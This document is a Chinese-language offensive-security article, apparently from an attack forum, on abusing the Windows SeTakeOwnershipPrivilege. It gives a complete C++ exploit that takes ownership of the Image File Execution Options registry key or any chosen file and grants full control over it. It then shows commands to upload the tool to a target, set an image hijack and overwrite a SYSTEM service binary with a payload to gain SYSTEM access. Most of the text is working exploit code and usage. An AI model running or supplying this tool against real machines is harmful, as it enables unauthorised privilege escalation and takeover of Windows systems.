SeTakeOwnershipPrivilege
------------------------

### 禁止任何公众号/营销号转发

SeTakeOwnershipPrivilege 特权在 Microsoft 官方文档中被描述为 “*Take ownership of files or other objects*”，该特权允许进程通过授予 WRITE\_OWNER 访问权限来获得对象的所有权而无需被授予任意访问权限。

SeTakeOwnershipPrivilege 特权在攻击面上类似于 SeRestorePrivilege，由于可以接管任意对象，因此可以修改对象的 ACL。我们通过修改 Image File Execution Options 注册表或系统资源的 DACL，使我们拥有完全控制权限，并通过映像劫持、DLL 劫持或劫持服务等方法来获得本地特权提升。

滥用该特权，需要先调用一次 `SetNamedSecurityInfoW()` 函数重新设置目标对象的所有者，以获得对象的所有权，如下所示，所有者通过 Sid 来识别。

```c++
// Take owner ship
dwRes = SetNamedSecurityInfoW(
    pObjectName,
    ObjectType,
    OWNER_SECURITY_INFORMATION,
    pTokenUser->User.Sid,
    NULL,
    NULL,
    NULL
);
if (dwRes != ERROR_SUCCESS)
{
    wprintf(L"[-] SetNamedSecurityInfoW Error: [%u].\n", dwRes);
    return status;
}
wprintf(L"[*] Set the owner in the object's security descriptor.\n");
```

然后哦，我们需要一个新的 DACL 并更新到目标对象的安全描述符中，新的 DACL 将为我们授予目标对象的完全控制权限。构建 ACL 需要构建 EXPLICIT\_ACCESS 对象，并使用 `SetEntriesInAclW()` 函数来构建 ACL 对象，如下所示。

```c++
ea[0].grfAccessPermissions = grfAccessPermissions;
ea[0].grfAccessMode = SET_ACCESS;
ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
ea[0].Trustee.TrusteeType = TRUSTEE_IS_USER;
ea[0].Trustee.ptstrName = (LPWSTR)pTokenUser->User.Sid;    // Sid of owner
dwRes = SetEntriesInAclW(1, ea, pOldDACL, &pNewDACL);

if (dwRes != ERROR_SUCCESS)
{
    wprintf(L"[-] SetEntriesInAclW Error: [%u].\n", dwRes);
    return status;
}
wprintf(L"[*] Create a new access control list.\n");
```

最后，再一次调用 `SetNamedSecurityInfoW()` 函数，将上述 DACL 对象更新到目标对象中，如下所示。

```c++
// Now that we are the owner, try again to modify the object's DACL.
dwRes = SetNamedSecurityInfoW(
    pObjectName,
    ObjectType,
    DACL_SECURITY_INFORMATION,
    NULL,
    NULL,
    pNewDACL,
    NULL
);
if (dwRes != ERROR_SUCCESS)
{
    wprintf(L"[-] SetNamedSecurityInfoW Error: [%u].\n", dwRes);
    return status;
}
else
{
    wprintf(L"[*] Now that we are the owner, and modify the object's DACL.\n");
    status = TRUE;
}
```

下面给出可供参考的利用代码，首先通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeTakeOwnershipPrivilege 特权，然后通过上述过程滥用该特权。如果执行时 `-e` 参数为 “Registry”，则会接管 `Image File Execution Options` 注册表对象。如果 `-e` 参数为 “File”，则可以接管关键系统文件。

- SeTakeOwnershipPrivilege.cpp

```c++
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <sddl.h>
#include <aclapi.h>

PTOKEN_USER GetTokenUserInformation(HANDLE hToken)
{
    DWORD dwReturnLength = 0;
    PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(sizeof(TOKEN_USER));

    // Get token information, set tokenInfo.
    if (GetTokenInformation(hToken, TokenUser, NULL, 0, &dwReturnLength) || GetLastError() == ERROR_INSUFFICIENT_BUFFER)
    {
        pTokenUser = (PTOKEN_USER)realloc(pTokenUser, dwReturnLength *= 2);
        if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwReturnLength, &dwReturnLength))
        {
            wprintf(L"[-] Failed to get token user information.\n");
            CloseHandle(hToken);
            free(pTokenUser);
            return NULL;
        }
    }
    return pTokenUser;
}

BOOL ExploitSeTakeOwnershipPrivilege(HANDLE hToken, SE_OBJECT_TYPE ObjectType, LPWSTR pObjectName, DWORD grfAccessPermissions)
{
    BOOL status = FALSE;
    PACL pOldDACL = NULL;
    PACL pNewDACL = NULL;
    EXPLICIT_ACCESS ea[1];
    PTOKEN_USER pTokenUser;
    LPWSTR stringSid;
    DWORD dwRes;

    pTokenUser = GetTokenUserInformation(hToken);

    dwRes = GetNamedSecurityInfoW(
        (LPCWSTR)pObjectName, 
        ObjectType,
        DACL_SECURITY_INFORMATION,
        NULL,
        NULL, 
        &pOldDACL, 
        NULL, 
        NULL
    );
    if (dwRes != ERROR_SUCCESS)
    {
        printf("[-] GetNamedSecurityInfoW Error: [%u].\n", dwRes);
        return status;
    }
    wprintf(L"[*] Get a copy of the security descriptor for the object.\n");

    // Take owner ship
    dwRes = SetNamedSecurityInfoW(
        pObjectName,
        ObjectType,
        OWNER_SECURITY_INFORMATION,
        pTokenUser->User.Sid,
        NULL,
        NULL,
        NULL
    );
    if (dwRes != ERROR_SUCCESS)
    {
        wprintf(L"[-] SetNamedSecurityInfoW Error: [%u].\n", dwRes);
        return status;
    }
    wprintf(L"[*] Set the owner in the object's security descriptor.\n");

    ea[0].grfAccessPermissions = grfAccessPermissions;
    ea[0].grfAccessMode = SET_ACCESS;
    ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
    ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[0].Trustee.TrusteeType = TRUSTEE_IS_USER;
    ea[0].Trustee.ptstrName = (LPWSTR)pTokenUser->User.Sid;    // Sid of owner

    dwRes = SetEntriesInAclW(1, ea, pOldDACL, &pNewDACL);
    if (dwRes != ERROR_SUCCESS)
    {
        wprintf(L"[-] SetEntriesInAclW Error: [%u].\n", dwRes);
        return status;
    }
    wprintf(L"[*] Create a new access control list.\n");

    // Now that we are the owner, try again to modify the object's DACL.
    dwRes = SetNamedSecurityInfoW(
        pObjectName,
        ObjectType,
        DACL_SECURITY_INFORMATION,
        NULL,
        NULL,
        pNewDACL,
        NULL
    );
    if (dwRes != ERROR_SUCCESS)
    {
        wprintf(L"[-] SetNamedSecurityInfoW Error: [%u].\n", dwRes);
        return status;
    }
    else
    {
        wprintf(L"[*] Now that we are the owner, and modify the object's DACL.\n");
        status = TRUE;
    }
    return status;
}

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
    BOOL status = FALSE;
    LUID luidValue = { 0 };
    TOKEN_PRIVILEGES tokenPrivileges;

    // Get the LUID value of the privilege for the local system
    if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
    {
        wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
        return status;
    }

    // Set escalation information
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luidValue;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Elevate Process Token Access
    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
    {
        wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
        return status;
    }
    else
    {
        status = TRUE;
    }
    return status;
}

void PrintUsage()
{
    wprintf(
        L"Abuse of SeTakeOwnershipPrivilege by @WHOAMI (whoamianony.top)\n\n"
        L"Arguments:\n"
        L"  -h                     Show this help message and exit\n"
        L"  -e <Registry, File>    Specifies the type of object\n"
        L"  -t <ObjectName>        Specifies the name of object\n"
    );
}

int wmain(int argc, wchar_t* argv[])
{
    HANDLE hToken = NULL;
    LPCWSTR lpObjectType = L"Registry";
    LPCWSTR lpObjectName = L"MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options";
    SE_OBJECT_TYPE seObjectType = SE_REGISTRY_KEY;
    DWORD grfAccessPermissions = KEY_ALL_ACCESS;

    while ((argc > 1) && (argv[1][0] == '-'))
    {
        switch (argv[1][1])
        {
        case 'h':
            PrintUsage();
            return 0;
        case 'e':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                lpObjectType = (LPCWSTR)argv[1];
                if (!wcscmp(lpObjectType, L"Registry"))
                {
                    seObjectType = SE_REGISTRY_KEY;
                    grfAccessPermissions = KEY_ALL_ACCESS;
                }
                if (!wcscmp(lpObjectType, L"File"))
                {
                    seObjectType = SE_FILE_OBJECT;
                    grfAccessPermissions = GENERIC_ALL;
                }
            }
            break;
        case 't':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                lpObjectName = (LPCWSTR)argv[1];
            }
            break;
        default:
            wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
            PrintUsage();
            return 0;
        }

        ++argv;
        --argc;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
    {
        wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
        return 0;
    }
    // Enable SeTakeOwnershipPrivilege for the current process token.
    if (EnableTokenPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME))
    {
        if (ExploitSeTakeOwnershipPrivilege(hToken, seObjectType, (LPWSTR)lpObjectName, grfAccessPermissions))
        {
            return 1;
        }
    }
}
```

将编译并生成好的 SeTakeOwnershipPrivilege.exe 上传到目标主机，执行以下命令接管 `Image File Execution Options` 注册表对象，然后直接通过 `reg` 命令设置映像劫持即可，如下图所示。

```powershell
SeTakeOwnershipPrivilege.exe -e "Registry" -t "MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
```

![image-20230214192438120](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-2c0fc4772c663b36f3f550226eabceb68643462e.png)

如下图所示，可以看到，SeTakeOwnershipPrivilege.exe 执行后 `Image File Execution Options` 注册表项的所有者变成了 Marcus 用户，并且对其拥有完全控制权限，如下图所示。

![image-20230214192003442](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-2023c11fa8adeb196f0c74eadc10ae6462b65827.png)

此外，如果我们指定 `-e` 为 ”File“，则可以接管任意文件。假设 TestSrv 是一个以 NT AUTHORITY\\SYSTEM 权限运行的服务，其二进制文件路径为 ”C:\\Program Files\\TestService\\TestSrv.exe“。执行以下命令，接管该服务的二进制文件并将其覆盖为攻击载荷，如下图所示。

```powershell
.\\SeTakeOwnershipPrivilege.exe -e "File" -t "C:\Program Files\TestService\TestSrv.exe"
```

![image-20230214194658736](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-d3f580ea2047434be945147a5578ec843882488e.png)

当系统或服务重启时，目标系统上线，并且为 NT AUTHORITY\\SYSTEM 权限，如下图所示。

![image-20230214195126644](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-781248dc0faabb9284c7e598bf0486f30f63b56b.png)